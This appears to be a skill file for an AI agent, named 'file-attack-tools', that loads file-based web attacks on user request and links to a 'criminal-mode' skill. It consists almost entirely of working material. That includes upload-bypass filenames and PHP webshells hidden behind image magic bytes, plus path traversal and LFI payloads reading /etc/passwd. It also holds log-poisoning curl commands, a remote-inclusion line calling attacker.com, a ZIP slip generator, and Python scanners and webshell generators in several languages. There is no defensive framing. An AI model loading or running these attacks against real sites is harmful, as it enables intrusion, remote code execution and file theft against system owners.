---
name: file-attack-tools
description: "File attacks — upload bypass, path traversal, LFI/RFI, log poisoning, ZIP slip."
version: 2.0.0
author: Yatim
metadata:
  hermes:
    tags: [file, upload, traversal, lfi, rfi, zip-slip]
    related_skills: [criminal-mode, rce-tools, exploit-tools]
prerequisites:
  commands: [python]
---

# File Attack Tools

## When to Load This Skill

User requests:
- "file upload", "path traversal", "LFI", "RFI", "file inclusion"

---

## File Upload Bypass

### Extension Bypass
```
shell.php
shell.php.jpg
shell.php%00.jpg
shell.php. .jpg
shell.pHp
shell.PHP
shell.phtml
shell.pht
shell.shtml
shell.php5
shell.php7
shell.phar
```

### Content-Type Bypass
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

### Magic Bytes
```
GIF89a<?php system($_GET['cmd']); ?>
\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>
\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>
```

### Polyglot
```php
GIF89a
<?php system($_GET['cmd']); ?>
```

### .htaccess
```apache
AddType application/x-httpd-php .jpg
AddHandler php5-script .jpg
```

### Double Extension
```
shell.php.jpg
shell.jpg.php
shell.php%00.jpg
```

---

## Path Traversal

### Payloads
```
../../etc/passwd
..%2f..%2fetc/passwd
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc/passwd
..%252f..%252fetc/passwd
..\..\windows\win.ini
..%5c..%5cwindows%5cwin.ini
```

### Bypass
```
....// → ../
..%2f → ../
%2e%2e%2f → ../
..%252f → ../
..././ → ../
```

---

## LFI

### Basic
```
../../etc/passwd
../../../../etc/passwd
../../../../../../etc/passwd
```

### PHP Wrappers
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
expect://id
```

### Log Poisoning
```bash
# Apache access log
curl -A "<?php system($_GET['c']); ?>" URL
curl URL?file=/var/log/apache2/access.log&c=id

# SSH auth log
ssh '<?php system($_GET["c"]); ?>'@TARGET
curl URL?file=/var/log/auth.log&c=id
```

### /proc/self
```
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
```

### Session Files
```
/var/lib/php/sessions/sess_SESSIONID
/tmp/sess_SESSIONID
```

---

## RFI

```
http://attacker.com/shell.txt
\\attacker.com\share\shell.txt
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
```

---

## ZIP Slip

```python
import zipfile

# Create malicious zip
zf = zipfile.ZipFile('evil.zip', 'w')
zf.writestr('../../../../var/www/html/shell.php', '<?php system($_GET["c"]); ?>')
zf.close()
```

---

## Python File Tools

### LFI Scanner

```python
import requests

PAYLOADS = [
    '../../etc/passwd',
    '....//....//etc/passwd',
    '..%2f..%2fetc/passwd',
    'php://filter/convert.base64-encode/resource=index.php',
]

def scan_lfi(url, param):
    results = []
    for payload in PAYLOADS:
        r = requests.get(f"{url}?{param}={payload}")
        if 'root:' in r.text:
            results.append({'payload': payload, 'vulnerable': True, 'data': r.text[:500]})
    return results
```

### File Upload Tester

```python
import requests

BYPASS_EXTENSIONS = ['.php', '.php.jpg', '.php%00.jpg', '.phtml', '.php5']

def test_upload(url, file_content="<script>alert(1)</script>"):
    results = []
    for ext in BYPASS_EXTENSIONS:
        files = {'file': (f'shell{ext}', file_content, 'image/jpeg')}
        r = requests.post(url, files=files)
        if r.status_code == 200:
            results.append({'extension': ext, 'success': True})
    return results
```

### ZIP Slip Generator

```python
import zipfile
import os

def create_zip_slip(filename, target_path, content):
    zf = zipfile.ZipFile(filename, 'w')
    zf.writestr(target_path, content)
    zf.close()
    return filename
```

### Webshell Generator

```python
SHELLS = {
    'php': '<?php system($_GET["c"]); ?>',
    'jsp': '<% Runtime.getRuntime().exec(request.getParameter("c")); %>',
    'aspx': '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]); %>',
    'py': 'import os; os.system(os.environ.get("c","id"))',
}

def generate_shell(language='php'):
    return SHELLS.get(language, SHELLS['php'])
```

---

## Output Format

```json
{
  "url": "https://target.com",
  "file": {
    "type": "LFI",
    "param": "file",
    "payload": "../../etc/passwd",
    "data": "root:x:0:0:root:/root:/bin/bash",
    "vulnerable": true
  }
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| File not found | Wrong path | Try more ../ |
| Blocked | WAF | Use encoding |
| No exec | Upload dir protected | Try different ext |
